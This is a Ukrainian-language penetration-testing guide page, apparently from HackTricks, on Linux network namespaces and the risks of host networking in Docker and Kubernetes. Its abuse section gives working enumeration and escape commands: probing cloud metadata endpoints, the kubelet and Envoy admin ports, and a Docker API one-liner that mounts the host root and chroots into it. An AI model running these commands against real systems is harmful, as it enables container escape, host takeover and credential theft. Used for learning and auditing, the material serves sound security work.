# Мережевий простір імен

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Мережевий простір імен ізолює ресурси, пов’язані з мережею, зокрема інтерфейси, IP-адреси, таблиці маршрутизації, стан ARP/neighbor, правила firewall, сокети, абстрактний простір імен UNIX-domain сокетів і вміст таких файлів, як `/proc/net`. Саме тому container може мати те, що виглядає як власний `eth0`, власні локальні маршрути та власний loopback-пристрій, не володіючи реальною мережевою підсистемою host.

З погляду безпеки це важливо, оскільки мережева ізоляція — це значно більше, ніж прив’язування портів. Приватний мережевий простір імен обмежує те, що workload може безпосередньо спостерігати або переналаштовувати. Щойно цей простір імен стає спільним із host, container може раптово отримати видимість host listeners, локальних сервісів host, абстрактних кінцевих точок AF_UNIX і мережевих точок керування, які ніколи не призначалися для доступу application.

## Робота

Щойно створений мережевий простір імен починається з порожнього або майже порожнього мережевого середовища, доки до нього не буде під’єднано інтерфейси. Після цього container runtimes створюють або під’єднують virtual interfaces, призначають адреси та налаштовують маршрути, щоб workload отримав очікуване підключення. У bridge-based deployments це зазвичай означає, що container бачить інтерфейс на основі veth, під’єднаний до host bridge. У Kubernetes CNI plugins виконують еквівалентне налаштування для Pod networking.

Ця архітектура пояснює, чому `--network=host` або `hostNetwork: true` є настільки суттєвою зміною. Замість отримання підготовленого приватного мережевого стека workload приєднується до фактичного мережевого стека host.

## Лабораторія

Ви можете побачити майже порожній мережевий простір імен за допомогою:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
А також ви можете порівняти звичайні контейнери та контейнери з host network за допомогою:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Контейнер із host networking більше не має власного ізольованого представлення сокетів та інтерфейсів. Ця зміна сама по собі вже є суттєвою, ще до того, як ви з'ясуєте, які capabilities має процес.

## Використання runtime

Docker і Podman зазвичай створюють приватний network namespace для кожного контейнера, якщо не налаштовано інше. Kubernetes зазвичай надає кожному Pod власний network namespace, спільний для контейнерів усередині цього Pod, але відокремлений від host. Це означає, що `127.0.0.1` зазвичай є локальним для Pod, а не для контейнера: listener, прив'язаний лише до localhost в одному контейнері, зазвичай доступний його sidecars і сусіднім контейнерам. Системи Incus/LXC також забезпечують ізоляцію на основі network namespace, часто з ширшим розмаїттям налаштувань віртуальної мережі.

Загальний принцип полягає в тому, що приватна мережа є типовою межею ізоляції, тоді як host networking є явною відмовою від цієї межі.

## Неправильні налаштування

Найважливіша неправильна конфігурація — це спільне використання host network namespace. Іноді це роблять для підвищення продуктивності, низькорівневого моніторингу або зручності, але це усуває одну з найчіткіших доступних для контейнерів меж. Listener-и, локальні для host, стають доступними безпосередніше, сервіси, доступні лише через localhost, можуть стати доступними, а capabilities на кшталт `CAP_NET_ADMIN` або `CAP_NET_RAW` стають значно небезпечнішими, оскільки операції, які вони дозволяють, тепер застосовуються до власного мережевого середовища host.

Інша проблема — надмірне надання capabilities, пов'язаних із мережею, навіть коли network namespace є приватним. Приватний namespace справді допомагає, але не робить raw sockets або розширене керування мережею безпечними.

У Kubernetes параметр `hostNetwork: true` також змінює рівень довіри до сегментації мережі на рівні Pod. Kubernetes зазначає, що багато network plugins не можуть належним чином розрізняти трафік Pod із `hostNetwork` під час зіставлення `podSelector` / `namespaceSelector` і тому обробляють його як звичайний трафік node. З погляду атакера це означає, що скомпрометований workload із `hostNetwork` часто слід розглядати як мережеву точку опори на рівні node, а не як звичайний Pod, який усе ще обмежений тими самими припущеннями щодо політик, що й workloads в overlay network.

## Зловживання

У середовищах зі слабкою ізоляцією атакери можуть перевіряти listening services host, отримувати доступ до management endpoints, прив'язаних лише до loopback, прослуховувати або перехоплювати трафік залежно від конкретних capabilities і середовища, а також змінювати routing і стан firewall, якщо присутній `CAP_NET_ADMIN`. У кластері це також може спростити lateral movement і розвідку control plane.

Якщо ви підозрюєте використання host networking, спочатку підтвердьте, що видимі інтерфейси та listeners належать host, а не ізольованій мережі контейнера:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Сервіси, доступні лише через loopback, часто є першим цікавим відкриттям:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Абстрактні UNIX-сокети — ще одна ціль, яку легко не помітити, оскільки вони scoped до network namespace, навіть якщо не виглядають як TCP/UDP listeners і можуть не існувати як filesystem paths у `/run`. Тому container із host network може успадкувати доступ до control channels, доступних лише на host, які взагалі не були bind-mounted у container:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Історичним прикладом була вразливість `containerd-shim`, пов’язана з exposure abstract socket, але ширший урок важливіший за конкретний CVE: щойно workload приєднується до host network namespace, abstract AF_UNIX services також стають частиною attack surface. Якщо ці sockets виглядають пов’язаними з runtime або адміністративними функціями, виконайте pivot до [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Якщо network capabilities присутні, перевірте, чи може workload inspect або alter видимий stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
У сучасних ядрах host networking разом із `CAP_NET_ADMIN` може також відкривати доступ до шляху проходження пакетів, виходячи за межі простих змін `iptables` / `nftables`. `tc` qdiscs і filters також мають область видимості namespace, тому в спільному host network namespace вони застосовуються до інтерфейсів хоста, які контейнер може бачити. Якщо додатково присутній `CAP_BPF`, релевантними також стають мережеві eBPF-програми, як-от TC і XDP loaders:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Це важливо, оскільки зловмисник може дзеркалити, перенаправляти, формувати або відкидати трафік на рівні інтерфейсу хоста, а не лише переписувати правила firewall. У приватному network namespace ці дії обмежені представленням контейнера; у спільному host namespace вони впливають на хост.

У кластерних або cloud-середовищах host networking також виправдовує швидку локальну розвідку metadata та сервісів, суміжних із control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
У Kubernetes пам’ятайте, що компрометація **будь-якого** контейнера в Pod із кількома контейнерами також надає доступ до localhost-слухачів, відкритих контейнерами-сусідами та sidecar-контейнерами, оскільки весь Pod використовує один мережевий namespace. Це особливо важливо для service-mesh, observability та helper-контейнерів, чиї адміністративні або debug-інтерфейси навмисно доступні лише всередині Pod, а не в усьому кластері:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Розглядайте **«прив’язаний до localhost»** як **приватний для Pod**, а не **приватний для контейнера**. Після компрометації одного контейнера в Pod це припущення більше не справджується.

### Повний приклад: Host networking + доступ до локального runtime / Kubelet

Host networking не забезпечує автоматично root-доступ до хоста, але часто відкриває сервіси, доступні навмисно лише з самого node. Якщо один із цих сервісів має слабкий захист, host networking стає прямим шляхом до privilege escalation.

Docker API на localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet на localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Вплив:

- прямий компроміс хоста, якщо локальний runtime API доступний без належного захисту
- розвідка кластера або lateral movement, якщо kubelet чи локальні агенти доступні
- маніпуляція трафіком або відмова в обслуговуванні у поєднанні з `CAP_NET_ADMIN`

## Перевірки

Мета цих перевірок — з’ясувати, чи має процес приватний мережевий стек, які маршрути та слухачі видимі, а також чи виглядає мережеве представлення подібним до хостового ще до перевірки capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Що тут цікавого:

- Якщо `/proc/self/ns/net` і `/proc/1/ns/net` уже виглядають як host-like, контейнер може спільно використовувати мережевий namespace хоста або інший не приватний namespace.
- `lsns -t net` і `ip netns identify` корисні, коли shell уже перебуває в іменованому або persistent namespace і потрібно зіставити його з об'єктами `/run/netns` на стороні хоста.
- `ss -lntup` особливо цінний, оскільки показує слухачі, доступні лише через loopback, і локальні management endpoints. `ss -xap` та `/proc/net/unix` доповнюють огляд abstract-сокетів, які звичайний пошук сокетів у файловій системі не виявляє.
- Маршрути, назви інтерфейсів, firewall context, стан `tc` і eBPF attachments стають набагато важливішими, якщо присутні `CAP_NET_ADMIN`, `CAP_NET_RAW` або `CAP_BPF`.
- У Kubernetes невдала резолюція service name з `hostNetwork` Pod може просто означати, що Pod не використовує `dnsPolicy: ClusterFirstWithHostNet`, а не те, що service відсутній.
- У multi-container Pod localhost listeners належать усьому мережевому namespace Pod, тому перевіряйте sidecars і sibling containers, перш ніж вважати, що порт, доступний лише через loopback, недосяжний із compromised container.

Під час перевірки контейнера завжди оцінюйте network namespace разом із набором capabilities. Host networking у поєднанні із сильними network capabilities — це зовсім інша модель безпеки, ніж bridge networking із вузьким набором default capabilities.

## Посилання

- [Kubernetes NetworkPolicy та caveats `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` та ізоляція abstract UNIX socket](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory: abstract Unix domain sockets, відкриті для host-network containers](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Вимоги до eBPF token і capabilities для network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
